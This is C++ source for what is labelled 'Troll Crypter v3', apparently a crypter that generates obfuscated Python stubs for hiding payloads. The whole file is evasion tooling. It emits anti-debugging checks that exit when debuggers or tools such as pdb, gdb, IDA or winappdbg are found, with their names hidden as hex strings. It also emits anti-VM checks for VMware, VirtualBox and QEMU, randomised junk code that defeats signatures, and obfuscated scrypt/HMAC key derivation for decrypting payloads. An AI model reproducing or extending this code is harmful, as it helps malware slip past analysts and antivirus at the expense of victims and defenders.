// Troll Crypter v3 - Mason Group / Freemasonry
// Developed by ABOLHB

#include "codegen/codegen.h"
#include "crypto/random.h"
#include <sstream>
#include <iomanip>

namespace troll {

std::string AntiDebugGen::full() {
    return R"(def _d():
    import sys,os
    if sys.gettrace() is not None:
        sys.exit(0)
    _m=[]
    _m.append(bytes.fromhex("707964657664").decode())
    _m.append(bytes.fromhex("706462").decode())
    _m.append(bytes.fromhex("626462").decode())
    _m.append(bytes.fromhex("77696e617070646267").decode())
    _m.append(bytes.fromhex("676462").decode())
    _m.append(bytes.fromhex("747261636572").decode())
    _m.append(bytes.fromhex("7374726163").decode())
    _m.append(bytes.fromhex("696461").decode())
    for __x in _m:
        if __x in sys.modules:
            sys.exit(0)
    try:
        import ctypes
        if sys.platform==bytes.fromhex("77696e3332").decode():
            if ctypes.windll.kernel32.IsDebuggerPresent():
                sys.exit(0)
    except:
        pass
    try:
        if hasattr(sys,bytes.fromhex("5f64656275676d616c6c6f635f7374617473").decode()):
            sys.exit(0)
    except:
        pass
_d())";
}

std::string AntiDebugGen::inline_check() {
    return "if sys.gettrace() is not None:sys.exit(0)\n"
           "if any(bytes.fromhex(h).decode() in sys.modules for h in "
           "[\"707964657664\",\"706462\",\"626462\",\"676462\",\"7374726163\"]):"
           "sys.exit(0)";
}

std::string AntiVMGen::full() {
    return R"(def _vm():
    import sys,os,platform
    try:
        mn=platform.node().lower()
        _vn=[bytes.fromhex("76697274756f").decode(),bytes.fromhex("766d77617265").decode(),bytes.fromhex("7662").decode(),bytes.fromhex("71656d75").decode()]
        for _v in _vn:
            if _v in mn:
                sys.exit(0)
    except:
        pass
    try:
        import multiprocessing
        if multiprocessing.cpu_count()<2:
            sys.exit(0)
    except:
        pass
_vm())";
}

std::string JunkGen::lines(int count) {
    std::ostringstream ss;
    for (int i = 0; i < count; i++) {
        std::string vn = Random::name(4, 7);
        int k = Random::range(0, 7);
        switch (k) {
            case 0: ss << vn << "=hashlib.md5(os.urandom(" << Random::range(8,24) << ")).hexdigest()"; break;
            case 1: ss << vn << "=sum(range(" << Random::range(10,80) << "))"; break;
            case 2: ss << vn << "=[x^" << Random::range(1,255) << " for x in range(" << Random::range(5,30) << ")]"; break;
            case 3: ss << vn << "=int.from_bytes(os.urandom(" << Random::range(2,6) << "),'big')"; break;
            case 4: ss << vn << "=bytes(" << Random::range(5,24) << ")"; break;
            case 5: ss << vn << "=hex(" << Random::bits(32) << ")"; break;
            case 6: ss << vn << "=hashlib.sha384(os.urandom(" << Random::range(4,32) << ")).digest()"; break;
            default: ss << vn << "=" << Random::bits(16) << "^" << Random::bits(16); break;
        }
        if (i < count - 1) ss << "\n";
    }
    return ss.str();
}

std::string JunkGen::mixed(int lo, int hi) {
    return lines(Random::range(lo, hi));
}

std::string KDFCodeGen::aes(const std::string& pfx, const std::string& a,
                             const std::string& x, const std::string& r,
                             const std::string& salt_hex) {
    std::ostringstream s;
    s << pfx << "sa=bytes.fromhex(\"" << salt_hex << "\")\n"
      << pfx << "v1=max(" << a << "*" << x << ",1)\n"
      << pfx << "v2=max(" << x << "^" << r << ",1)\n"
      << pfx << "v3=max(" << r << "*" << a << ",1)\n"
      << pfx << "b1=" << pfx << "v1.to_bytes((" << pfx << "v1.bit_length()+7)//8,'big')\n"
      << pfx << "b2=" << pfx << "v2.to_bytes((" << pfx << "v2.bit_length()+7)//8,'big')\n"
      << pfx << "b3=" << pfx << "v3.to_bytes((" << pfx << "v3.bit_length()+7)//8,'big')\n"
      << pfx << "cat=hashlib.sha512(" << pfx << "b1).digest()+hashlib.sha512(" << pfx << "b2).digest()+hashlib.sha512(" << pfx << "b3).digest()\n"
      << pfx << "mat=hashlib.sha512(" << pfx << "cat).digest()\n"
      << pfx << "buf=" << pfx << "mat\n"
      << "for _ki in range(" << r << "):\n"
      << "    " << pfx << "buf=hashlib.sha512(" << pfx << "buf+_ki.to_bytes(4,'big')).digest()\n"
      << "    " << pfx << "buf=hmac.new(" << pfx << "mat," << pfx << "buf,hashlib.sha512).digest()\n"
      << pfx << "k=scrypt(" << pfx << "buf," << pfx << "sa,key_len=32,N=2**14,r=8,p=1)";
    return s.str();
}

std::string KDFCodeGen::chacha(const std::string& pfx, const std::string& a,
                                const std::string& x, const std::string& r,
                                const std::string& salt_hex) {
    std::ostringstream s;
    s << pfx << "csa=bytes.fromhex(\"" << salt_hex << "\")\n"
      << pfx << "cv1=max(" << a << "^" << x << ",1)\n"
      << pfx << "cv2=max(" << x << "*" << r << ",1)\n"
      << pfx << "cb1=" << pfx << "cv1.to_bytes((" << pfx << "cv1.bit_length()+7)//8,'big')\n"
      << pfx << "cb2=" << pfx << "cv2.to_bytes((" << pfx << "cv2.bit_length()+7)//8,'big')\n"
      << pfx << "ccat=hashlib.sha512(" << pfx << "cb1).digest()+hashlib.sha512(" << pfx << "cb2).digest()\n"
      << pfx << "cmat=hashlib.sha512(" << pfx << "ccat).digest()\n"
      << pfx << "cbuf=" << pfx << "cmat\n"
      << "for _ci in range(" << r << "):\n"
      << "    " << pfx << "cbuf=hashlib.sha512(" << pfx << "cbuf+_ci.to_bytes(4,'big')).digest()\n"
      << "    " << pfx << "cbuf=hmac.new(" << pfx << "cmat," << pfx << "cbuf,hashlib.sha512).digest()\n"
      << pfx << "ck=scrypt(" << pfx << "cbuf," << pfx << "csa,key_len=32,N=2**14,r=8,p=1)";
    return s.str();
}

}
